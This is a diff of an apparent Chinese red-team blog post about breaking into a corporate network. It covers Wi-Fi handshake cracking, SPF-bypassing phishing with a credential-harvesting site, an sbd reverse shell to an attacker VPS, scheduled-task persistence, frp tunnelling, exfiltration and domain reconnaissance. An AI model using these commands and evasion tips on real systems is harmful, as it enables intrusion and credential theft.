@@ -6,18 +6,18 @@
 <p>Wi-Fi 渗透的思路比较简单：抓取 Wi-Fi 通信数据包爆破口令 👉🏻 登录进入内网开始扫描。</p>
 <p>首先方便起见可以将 <code>airport</code> 用软链接加入 <em><code>/usr/local/bin</code></em> 目录下。</p>
 <p><code>airport -s</code> ，查看附近的 Wi-Fi 信息：</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-05%20%E4%B8%8B%E5%8D%884.36.56.jpg" alt="Screenshot 2020-09-05 下午4.36.56"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-09-05%20%E4%B8%8B%E5%8D%884.36.56.jpg" alt="Screenshot 2020-09-05 下午4.36.56"></p>
 <p>要用到 <code>BSSID</code> 和 <code>CHANNEL</code> ，提前保存一下。<code>BSSID</code> 表示无线路由器的 MAC 地址，<code>CHANNEL</code> 表示频道。另外，<code>RSSI</code> 表示信号强度，一般来说能量 <code>-60dBm</code> 左右的信号是最好的。</p>
 <p>然后开始尝试抓包：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 断开所有 Wi-Fi 连接</span><br><span class="line">$ airport -z</span><br><span class="line"></span><br><span class="line">2. 切换到对应的 Wi-Fi 的频道，注意 -c 和后面的频道数字不要留空格</span><br><span class="line">$ airport -c44</span><br><span class="line"></span><br><span class="line">3. 由于 airport 对于 mojave 有 bug，所以这里使用 tcpdump 抓包</span><br><span class="line">$ sudo tcpdump &quot;type mgt subtype beacon and ether src 填入对应路由器的BSSID信息&quot; -I -c 1 -i en0 -w ~/Desktop/beacon.cap</span><br><span class="line"></span><br><span class="line">// 执行这条命令时要注意，需要抓取到大于 4 个数据包，然后 ctrl-c 停止抓包即可</span><br><span class="line">$ sudo tcpdump &quot;ether proto 0x888e and ether host 填入对应路由器的BSSID信息&quot; -I -U -vvv -i en0 -w ~/Desktop/handshake.cap</span><br><span class="line"></span><br><span class="line">$ mergecap -a -F pcap -w ~/Desktop/capture.cap ~/Desktop/beacon.cap ~/Desktop/handshake.cap</span><br></pre></td></tr></table></figure>
 
 <p>⚠️ 注意，执行第二条抓取通信数据包的命令时，通常需要抓取大于或等于 4 个数据包，如图：</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8A%E5%8D%8810.18.39.jpg" alt="Screenshot 2020-08-14 上午10.18.39"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8A%E5%8D%8810.18.39.jpg" alt="Screenshot 2020-08-14 上午10.18.39"></p>
 <p>执行以上命令之后，最后会生成数据包文件： <em><code>~/Desktop/capture.cap</code></em> 。</p>
 <p>其实这种攻击的原理是截取网络中其他人与无线 AP 之间的通信，然后通过字典枚举来对接入者连接 Wi-Fi 时输入的口令进行碰撞来模拟登录，通过对比数据包内的信息来暴力破解，这就出现了一个问题：我们爆破的是「接入者」输入的口令，所以他必须输入正确的 Wi-Fi 密码才行，否则如果接入者在输入密码时随手输入了 <code>12345678</code> ，那我们成功抓取后也可以爆破出 <code>12345678</code> ，然而这并不是真正的 Wi-Fi 口令。</p>
 <p>完成抓包之后就可以开始爆破了，需要一个暴力破解的工具和一个好用的字典。工具可以用 <code>aircrack-ng</code> 套件或者 <code>hashcat</code> ，我这里用的是 <code>aircrack-ng</code> ，macOS 安装起来也比较方便。</p>
 <p>键入命令 <code>aircrack-ng -w dic.txt capture.cap</code> 开始爆破：</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8A%E5%8D%8810.20.07.jpg" alt="Screenshot 2020-08-14 上午10.20.07"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8A%E5%8D%8810.20.07.jpg" alt="Screenshot 2020-08-14 上午10.20.07"></p>
 <p>这里就破解成功了，然后我们就可以手牵着手一起进入内网啦。</p>
 <p>然而，怎么可能会这么轻易就让你进内网呢？可以看到企业的 Wi-Fi 分成了三段：Public、Staff、Intra，我们爆破出了 Public、Staff 的口令，然而 Public 是公用 Wi-Fi，与内网是隔离的，扫了一下也没啥收获；Staff 是员工使用的网络，做了 MAC 绑定；最重要的 Intra 有部署准入规则，且绑定了 MAC，还有其他的一些防护手段，即使找个空的工位插根网线直连 Intra 也过不了准入，无法分配 IP，Wi-Fi 渗透走到这一步似乎终结了。</p>
 <blockquote>
@@ -32,12 +32,12 @@
 <h3 id="🎣-邮件钓鱼"><a href="#🎣-邮件钓鱼" class="headerlink" title="🎣 邮件钓鱼"></a>🎣 邮件钓鱼</h3><p>Wi-Fi 渗透进入内网失败，只好换个思路，从邮件钓鱼入手。企业邮件安全其实是大公司都很头疼的一个问题，因为这里的弱点出现在人身上，而人是最难以掌控的，而有些人被骗之后，你劝他他还会觉得你是骗子，所以对于攻击者来说钓鱼邮件真是屡试不爽。</p>
 <p>这还是我头一次做邮件钓鱼攻击，中途学习了关于邮件安全的不少东西。</p>
 <h4 id="SMTP-协议"><a href="#SMTP-协议" class="headerlink" title="SMTP 协议"></a>SMTP 协议</h4><p>简单邮件传输协议，在早期其实是有很多问题的，以下讲到的 spf 校验、DKIM、DMARC 其实都是为了补足当初的安全问题而提出的防护性措施。SMTP 协议和 HTTP 协议其实很相似，早期都是明文协议，也有状态码的概念， <code>250</code> 表示邮件发送成功，整个 SMTP 协议的报文分为两类：</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/smtp.jpg" alt="smtp"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/smtp.jpg" alt="smtp"></p>
 <p>其中信封中有 <code>MAIL FROM</code> 字段，信的内容中也有 <code>MAIL FROM</code> 字段，这时问题就出现了。一般邮箱客户端不会显示整个报文，只显示邮件的内容部分，那么我们通过伪造内容中的 <code>MAIL FROM</code> （发件人）字段，来迷惑收件人，但这还不够。</p>
 <h4 id="SPF-校验"><a href="#SPF-校验" class="headerlink" title="SPF 校验"></a>SPF 校验</h4><p>SPF，Sender Policy Framework，发件人策略框架。SMTP 协议不需要身份认证，利用这个特性可以伪造任意发件人。为了防止邮箱伪造，就出现了 SPF。当你定义了你域名的 SPF 记录后，接收邮件方会根据你的 SPF 记录来判断发送过来的 IP 地址是否被包含在 SPF 记录里面，如果在，则认为是一封正常的邮件，否则则认为是一封伪造的邮件。现在大部份反垃圾邮件系统都支持 SPF 验证，当然也有些低级邮箱不支持，或者域名本身没有设置 SPF 记录，所以就可以伪造邮件。</p>
 <p>其实邮件钓鱼，第一点就是要绕过 spf 校验，其他的邮件网关的关键字过滤等策略可以慢慢 fuzz。spf 是为了防范垃圾邮件而提出的一种 DNS 记录类型，是一种 TXT 类型的记录，用于登记某个域名拥有的用来外发邮件的所有 IP 地址。首先来看看 spf 长啥样，我们瞅瞅华为的 spf 记录：</p>
 <p><code>nslookup -q=TXT huawei.com</code></p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-05%20%E4%B8%8B%E5%8D%885.45.56.jpg" alt="Screenshot 2020-09-05 下午5.45.56"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-09-05%20%E4%B8%8B%E5%8D%885.45.56.jpg" alt="Screenshot 2020-09-05 下午5.45.56"></p>
 <p>一般 spf 的格式是： <code>v=spf1 [[pre] type [ext]] ... [mod]</code> 。</p>
 <p>解释一下：</p>
 <blockquote>
@@ -73,41 +73,41 @@
 <p>自己搭建邮件服务器，最主要的是邮箱信誉度的问题，如果信誉度较差，那么也会被邮件网关阻断，所以利用邮件分发平台是一个不错的思路，但是很多邮件分发平台存在注册、收费的问题，匿名性较低。</p>
 <p>一顿操作之后，发现还是 smtp2go + swaks + setoolkit 最好使，整体的攻击思路是：制作钓鱼邮件，伪造发件人字段，通过 spf 校验 👉🏻 钓鱼邮件中放入迷惑性内容，放入钓鱼网站地址从而获取目标域内 IP、账号和密码 👉🏻 拿到帐密之后，利用现有权限进行信息收集和权限扩张。</p>
 <p>首先钓鱼邮件的伪造部分，就必须得用到 swaks 了，其被称为 SMTP 协议的瑞士军刀，可以很灵活地操作 SMTP 报文，值得好好学习一番。</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/test.jpg" alt="test"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/test.jpg" alt="test"></p>
 <p>通过校验的钓鱼邮件（事后捕获）：</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/phish_mail.png" alt="phish_mail"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/phish_mail.png" alt="phish_mail"></p>
 <p>钓鱼邮件的内容其实也很有讲究，以往的什么系统补丁更新啊之类的老套路现如今已经没那么适用了，我们需要抓住他人的心理：不少人工作时都有过私自将内部资料转入转出的行为吧？假如你是一位程序员，或多或少你的 GitHub 会有你公司的代码吧？所以，邮件内容一定要紧紧地抓住目标的神经，让他忘记去判断邮件的真伪，要的是一上来就感到心慌的那种效果。</p>
 <p>此外，我们还需要搭建一个钓鱼网站用来接收目标键入的账号密码，理想的环境当然是完全仿真的钓鱼站点，但由于多方限制（主要是前端太渣。。）只好在 VPS 上魔改一个 dvwa 的登录口，无论对方输入正确或者错误的密码都将跳转到目标企业的 OA 系统。</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/phish_web.png" alt="phish_web"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/phish_web.png" alt="phish_web"></p>
 <p>还有，钓鱼网站的域名也需要正儿八经一点，实在不行写 IP 也比写一些弱智域名要好。。。要注意，在写钓鱼邮件时，域名或 IP 如果可以不写 <code>http://</code> 那就尽量不写，虽然仿真度稍逊，但是可以绕过邮件网关的检测，如果邮件网关一开始就直接把你钓鱼站点拉黑，那还搞毛线。。。</p>
 <p>理想状况下每次目标登录钓鱼网站时，都应将目标键入的帐密都存到数据库里，然后跳转至真实登录页面。然而为了赶时间，就用 setoolkit 的 <code>clone site</code> 模块克隆了魔改 dvwa 后的钓鱼登录页面，这样需要 setoolkit 持续监听，每当有人请求钓鱼站点时，setoolkit 都会有回显信息。</p>
 <p> <code>setoolkit 👉🏻 1) Social-Engineering Attacks 👉🏻 2) Website Attack Vectors 👉🏻 3) Credential Harvester Attack Method 👉🏻 2) Site Cloner</code> </p>
 <p>对于 setoolkit 其实也有很多小坑，比如需要安装最新版的 setoolkit，否则可能会无法正常运行；且最新版的 setoolkit 需要配置代理访问，否则 python 会报错（setoolkit 是用 python 写的）；另外 setoolkit 的更新也挺费事的。。贴个更新教程视频（需科学上网）： 🔗 <a href="https://youtu.be/DwpDihZzpQc" target="_blank" rel="noopener">https://youtu.be/DwpDihZzpQc</a></p>
 <p>搭建好钓鱼网站，针对特定目标发送钓鱼邮件，接下来只需要静静地等待就 OK。一开始我是没抱太大希望的，然而邮件发出后没等太久，就有鱼儿上钩了：</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/victim1.png" alt="victim1"></p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/victim.png" alt="victim"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/victim1.png" alt="victim1"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/victim.png" alt="victim"></p>
 <p>成功拿到域账号和密码，邮件钓鱼不比爆破效率高多了？况且这还只是针对员工信息钓鱼，邮件附件免杀后门绕过邮件网关检测然后上线 CS 同样是一个切实可行的思路，但是在免杀方面还是得花点心思。我总觉得爆破这东西不靠谱，可能是我还没领悟到爆破的精髓吧。。。</p>
 <h2 id="🕹️-内网渗透"><a href="#🕹️-内网渗透" class="headerlink" title="🕹️ 内网渗透"></a>🕹️ 内网渗透</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>对企业进行内网渗透攻击，需要对该公司有诸多了解，比如员工的上下班时间、公司是否强制员工下班必须关电脑等等，这些可以通过求职招聘等方式去了解。如此一来我们在下班时间便有机可乘，可以无感知地登入员工电脑了。</p>
 <p>另外，还要注意观察企业员工所使用的机器，是台式机居多还是笔记本居多。如果是大公司、政企等，一般以台式机为主，这样就需要留心公司的会议室，会议室一般会有投影仪，还有配合投影仪的一台电脑（这种机器一般权限设置得比较死，只允许进行远程连接），通常会议时员工通过该电脑可以远程登录域账号来进行 PPT 演示，我们同样可以利用这一点，在临近下班的时候，进入公司的某一间会议室，拿着我们已经获取到的域账号和密码进行远程登录，这种方式比较隐蔽。但要注意 Windows10 之后只允许同时间内一个用户登入，所以一定要耐得住寂寞，不要打草惊蛇。</p>
 <h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>拿到账号密码之后，我们在临近下班的时间点，选择一间会议室，就可以开搞了。</p>
 <p>首先确定一波基本信息，是否是域环境、域名、有几个域控、主域控、域控名称、网段等等。</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%884.57.01.jpg" alt="Screenshot 2020-09-07 下午4.57.01"></p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.05.44.jpg" alt="Screenshot 2020-09-07 下午5.05.44"></p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.09.03.jpg" alt="Screenshot 2020-09-07 下午5.09.03"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%884.57.01.jpg" alt="Screenshot 2020-09-07 下午4.57.01"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.05.44.jpg" alt="Screenshot 2020-09-07 下午5.05.44"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.09.03.jpg" alt="Screenshot 2020-09-07 下午5.09.03"></p>
 <p>其次我们要知道钓鱼获得的账号对应机器的 IP，我们可以先 <code>net user /domain</code> 看看当前网段具有哪些用户，在大公司的域环境中，对于员工的电脑名称设置一般是有要求的，摸索到名称规范之后，可以直接 <code>ping</code> 该用户名，就可以得到对应的 IP。</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.02.18.jpg" alt="Screenshot 2020-09-07 下午5.02.18"></p>
-<p> <img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.21.02.jpg" alt="Screenshot 2020-09-07 下午5.21.02"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.02.18.jpg" alt="Screenshot 2020-09-07 下午5.02.18"></p>
+<p> <img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.21.02.jpg" alt="Screenshot 2020-09-07 下午5.21.02"></p>
 <p>接着 <code>mstsc</code> 登入之后，发现是域用户和本地管理员的权限，这意味着我们可以做抓取本地 Hash、新建用户等等高权限操作。抓取 Hash 稍后再说，首先搞定权限维持的事儿。</p>
 <h4 id="放置后门"><a href="#放置后门" class="headerlink" title="放置后门"></a>放置后门</h4><p>大概看了下办公网机器部署了准入设备和某国产杀软，准备放置 beacon 上线 CS（需要免杀）或者简单弹个 cmd 到 VPS。首先尝试了一下 CS beacon，全部被阻断，做了一些免杀可以绕过 360，但是没法绕过 FireEye，FireEye 是基于流量检测，真蛋疼。</p>
 <p>接着尝试了下 nc 连接 VPS，居然没有拦截和阻断。这里要注意的是不要直接弹 Windows system32 目录下的 <code>cmd.exe</code> ，可能会引起杀软报警，可以先复制出来到其他目录，再用 nc 进行调用。</p>
 <p>另外，因为 nc 是明文流量传输，太容易被发现，这里建议大伙儿用 sbd，其英文名为 <code>secure backdoor</code>  ，顾名思义是后门版本的 nc，它的加密采用 AES-128-CBC + HMAC-SHA1，是 nc 的衍生版。直接在目标机器下载 sbd 可能会被拦截，所以最好还是压缩包加密后放在自己的 VPS 上进行下载。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// victim</span><br><span class="line">c:\&gt; sbd.exe 1.1.1.1 8877 -e .\cmd.exe -v -n</span><br><span class="line"></span><br><span class="line">// attacker VPS</span><br><span class="line">$ sbd -l -p 8877</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8B%E5%8D%882.40.25.jpg" alt="Screenshot 2020-08-14 下午2.40.25"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8B%E5%8D%882.40.25.jpg" alt="Screenshot 2020-08-14 下午2.40.25"></p>
 <p>来看下流量对比（测试），nc 直接是明文流量：</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8810.31.12.jpg" alt="Screenshot 2020-09-08 上午10.31.12"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8810.31.12.jpg" alt="Screenshot 2020-09-08 上午10.31.12"></p>
 <p>而 sbd 是加密的流量：</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8810.32.51.jpg" alt="Screenshot 2020-09-08 上午10.32.51"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8810.32.51.jpg" alt="Screenshot 2020-09-08 上午10.32.51"></p>
 <p>还是很奇怪为什么免杀后的 CS beacon 会被检测阻断而 sbd 的流量却没有被 FireEye 拦截，可能是因为 beacon 的特征被 FireEye 检测到，而 sbd 不在黑名单里？所以说，作为红队成员除了要搞明白原理，还是得多尝试和碰运气啊 😓</p>
 <p>拿到 shell 之后，就不必再费力气冒着被保安 gank 的风险跑会议室了。。可以回去慢慢搞了。。另外，持久化后门也得下点功夫，直接就从两个常规的思路入手：服务和计划任务。</p>
 <h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>创建服务这块现在也被杀软盯得蛮紧的。这里需要注意的是工作目录最好普通一点，不要太招摇。</p>
@@ -120,15 +120,15 @@
 <p>后期在横向移动时，还会用到域内的计划任务设置，需要目标账户的密码。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 19:25 执行一次</span><br><span class="line">c:\&gt; schtasks.exe /create /s \\PC-Name /u &quot;USERNAME&quot; /p &quot;PASSWORD&quot; /ru &quot;SYSTEM&quot; /tn task1 /sc ONCE /st 19:25 /tr G:\\fuck_intra.bat /F</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/schtasks.png" alt="schtasks"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/schtasks.png" alt="schtasks"></p>
 <p>OK，这样一来，每天早上会弹回一个 shell，算是完成了后门持久化。</p>
 <h3 id="内网通信隧道"><a href="#内网通信隧道" class="headerlink" title="内网通信隧道"></a>内网通信隧道</h3><p>成功连接后门之后，为了能在外部更加方便地进行域渗透，还需要建立一些内网的通信隧道，首先从内网的端口转发开始，把内网机器的 3389 端口转发出来。</p>
 <h4 id="内网端口转发和映射"><a href="#内网端口转发和映射" class="headerlink" title="内网端口转发和映射"></a>内网端口转发和映射</h4><p>端口转发的工具实在太多了：rinetd、lcx、ew、venom、netsh 之类，各有优缺点吧，值得好好研究一番。这一部分我主要用 frp + lcx 直接把内网的 3389 映射到 VPS 再转发到本地，因为有防火墙会实时检测和阻断，所以要在 frpc 的配置文件头部设置 tls 加密，这样一来就可以绕过防火墙的检测了。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// frpc 配置文件</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 1.1.1.1  #VPS IP</span><br><span class="line">server_port = 6768  #VPS 端口</span><br><span class="line">tls_enable = true  #设置 tls 加密</span><br><span class="line"></span><br><span class="line">[https]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 3389</span><br><span class="line">remote_port = 2333  #将本地 3389 端口映射至公网的 2333</span><br></pre></td></tr></table></figure>
 
 <p>另外，lcx 也是老生常谈的端口转发的工具，就不过多赘述了，结合 frp 后的效果还算不错：</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8B%E5%8D%883.33.36.jpg" alt="Screenshot 2020-08-14 下午3.33.36"></p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8B%E5%8D%883.34.38.jpg" alt="Screenshot 2020-08-14 下午3.34.38"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8B%E5%8D%883.33.36.jpg" alt="Screenshot 2020-08-14 下午3.33.36"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8B%E5%8D%883.34.38.jpg" alt="Screenshot 2020-08-14 下午3.34.38"></p>
 <p>额。。突然反应过来，我直接连 VPS 的端口不就好了，干嘛还要用 lcx 映射到本地来呢。。。。。。</p>
 <h4 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h4><p>为什么要将内网代理出来呢，因为有些服务只提供给内网员工使用，比如 OA 系统、堡垒机系统、企业 wiki 等等，这些从外网是访问不到的。</p>
 <p>如果是 CS 或 msf 的后门，则可以很方便地用 SOCKS 搭配 proxifier 搭建隧道，然而 beacon 被 FireEye 杀得七零八落，很惨，只好想想别的思路：这个时候 SSR 就凸显出它的优势来了。</p>
@@ -143,9 +143,9 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// -S 表示以 server 模式运行</span><br><span class="line">c:\&gt; .\shadowsocks-libqss.exe -c config.json -S</span><br></pre></td></tr></table></figure>
 
 <p>此时 SSR 服务端将在本地的 <code>8388</code> 端口开始监听，然后按之前的方法将 <code>8388</code> 端口映射至 VPS 的 <code>12345</code> 端口，然后 attacker 本地的 SSR 客户端如下设置：</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8B%E5%8D%883.28.49.jpg" alt="Screenshot 2020-09-08 下午3.28.49"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8B%E5%8D%883.28.49.jpg" alt="Screenshot 2020-09-08 下午3.28.49"></p>
 <p>然后将浏览器代理设置为本地的 ssr 客户端代理端口即可，Windows 默认为 <code>1080</code> ，macOS 默认为 <code>1086</code> ，然后即可访问到内网服务，burp 同样将上游代理设置为 SSR 的代理端口即可。</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8B%E5%8D%883.10.28.jpg" alt="Screenshot 2020-09-08 下午3.10.28"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8B%E5%8D%883.10.28.jpg" alt="Screenshot 2020-09-08 下午3.10.28"></p>
 <p>然后就可以愉快地测试内网 web 服务的漏洞啦，好吧不经意间又加大了工作量。。。</p>
 <h4 id="数据传入和传出"><a href="#数据传入和传出" class="headerlink" title="数据传入和传出"></a>数据传入和传出</h4><p>敏感文件传出同样可以采用端口映射的思路：首先在本地建立一个文件夹，在该文件夹内用 python 启动一个 https 服务（用来绕过防火墙检测），然后将 https 监听的端口映射至公网即可。</p>
 <p>python-https 脚本：</p>
@@ -155,20 +155,20 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 生成 RSA 密钥</span><br><span class="line">$ openssl genrsa -des3 -out server.key 1024</span><br><span class="line"></span><br><span class="line">// 去除掉密钥文件保护密码</span><br><span class="line">$ openssl rsa -in server.key -out server.key</span><br><span class="line"></span><br><span class="line">// 生成ca对应的csr文件</span><br><span class="line">$ openssl req -new -key server.key -out server.csr</span><br><span class="line"></span><br><span class="line">// 自签名</span><br><span class="line">$ openssl x509 -req -days 1024 -in server.csr -signkey server.key -out server.crt</span><br><span class="line">$ cat server.crt server.key &gt; server.pem</span><br><span class="line"></span><br><span class="line">启动服务时在对应目录运行脚本即可</span><br></pre></td></tr></table></figure>
 
 <p>再骚一点的思路就是放个 webshell 上去，然后把本地起的 web 端口映射出来然后连接，不过略折腾，不搞了。</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8811.32.13.jpg" alt="Screenshot 2020-09-08 上午11.32.13"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8811.32.13.jpg" alt="Screenshot 2020-09-08 上午11.32.13"></p>
 <p>数据传入同样可以利用这种方式，用以传入恶意工具，但是问题在于目标机器下载的链接会直接暴露 VPS IP，如果目标内网有杀软持续检测，检测到恶意文件的链接地址可能会直接封禁，干。</p>
 <h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>其实整个内网渗透过程的关键就在于信息收集工作做得怎么样，很多时候不经意间收集到了一些关键的信息，或许就能四两拨千斤，一举拿下域控，所以在内网渗透时一定要注意细节。</p>
 <p>目标是拿下域控，有这么几种思路：探测内网存在的服务，看是否存在有漏洞的系统，比如 OA 等等；漏洞批量扫描，看是否能 RCE；利用之前钓鱼获得的帐密进行横向移动。最终的目的都是导出 Hash，看是否存在敏感用户或高权限账户的 Hash，然后再如此往复一步步深入。</p>
 <h4 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h4><p>进入内网后首先来一波内网扫描，看看自己所处的网段以及同网段的用户等等，探测存活主机直接用 <code>nbtscan</code> 即可：</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/intra_scan.png" alt="intra_scan"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/intra_scan.png" alt="intra_scan"></p>
 <p>K8gege 出品的 ladon 也非常好用，姿势很多。</p>
 <h4 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h4><p>其实刚进入域的时候通过 <code>nltest</code> 命令就已经获取到了域控的位置，定位域控其实有很多种方式：内网扫描开放 <code>389</code> 、 <code>636</code> 之类域控特定端口的主机； <code>net time</code> 命令定位域控；域内 dns 查询定位域控等等。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 列出域内存在的域控，其中 pdc 为主域控</span><br><span class="line">c:\&gt; nltest /dclist:xxx</span><br><span class="line"></span><br><span class="line">// 查询域控</span><br><span class="line">c:\&gt; nltest /dsgetdc:xxx</span><br><span class="line"></span><br><span class="line">// 获取 pdc 名称</span><br><span class="line">c:\&gt; nltest /dcname:xxx</span><br><span class="line"></span><br><span class="line">// 同步域内时间，时间服务器通常是域控</span><br><span class="line">c:\&gt; net time /domain</span><br><span class="line"></span><br><span class="line">// dns 查询，域内 DNS 服务器可能是域控</span><br><span class="line">c:\&gt; nslookup xxx.xxx.com</span><br><span class="line"></span><br><span class="line">// 查询域内域控的机器名称</span><br><span class="line">c:\&gt; net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure>
 
 <p>掌握好 Windows 的命令真的很重要啊，而且必须是信手拈来，关键时刻查手册可不行。</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-09%20%E4%B8%8A%E5%8D%8810.48.38.jpg" alt="Screenshot 2020-09-09 上午10.48.38"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/Screenshot%202020-09-09%20%E4%B8%8A%E5%8D%8810.48.38.jpg" alt="Screenshot 2020-09-09 上午10.48.38"></p>
 <h4 id="批量-POC-扫描"><a href="#批量-POC-扫描" class="headerlink" title="批量 POC 扫描"></a>批量 POC 扫描</h4><p>因为内网布置了某国内杀软，可以在域内批量打补丁，因此 <code>MS17-010</code> 之类的 RCE 没有检测到，倒是发现了 <code>CVE-2020-0796</code> 的踪迹，然而目前只有蓝屏的 POC，没法 RCE，哭惹。</p>
-<p><img src="//naykcin.top/2020/09/05/intra-fuck/CVE-2020-0796.png" alt="CVE-2020-0796"></p>
+<p><img src="//mucfo.cn/2020/09/05/intra-fuck/CVE-2020-0796.png" alt="CVE-2020-0796"></p>
 <p>K8gege 的 ladon 实在太方便了，速度也很快，目前已成为我域内渗透必上工具之一了。</p>
 <h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><p>换个思路，从横向移动开始搞吧，收集一波 Hash 再说。思路是通过已掌握的跳板机 IPC 连接其他机器 👉🏻 写入后门 👉🏻 计划任务定时执行 👉🏻 然后抓取 Hash。</p>
 <p>IPC 在内网真的太好用，然而要注意 server 12 之后的版本对外是默认关闭 smb 共享的（所以 MS17-010 失败），但是在域内因为需要文件传输，所以 <code>139</code> 、 <code>445</code> 都是开着的。</p>
@@ -186,9 +186,9 @@
 
 <p>不过这动静太大了，获取到 Hash 足矣。还有很多种抓取 Hash 的方式：mimikatz + PowerShell；msf；CS；读取 SAM 等等等等，具体情况需要具体分析。</p>
 <h4 id="意外发现"><a href="#意外发现" class="headerlink" title="意外发现"></a>意外发现</h4><p>一番 Hash 抓取之后，有意外的发现。在某台主机中抓取到了除本机域用户之外，其他用户的 Hash：</p>
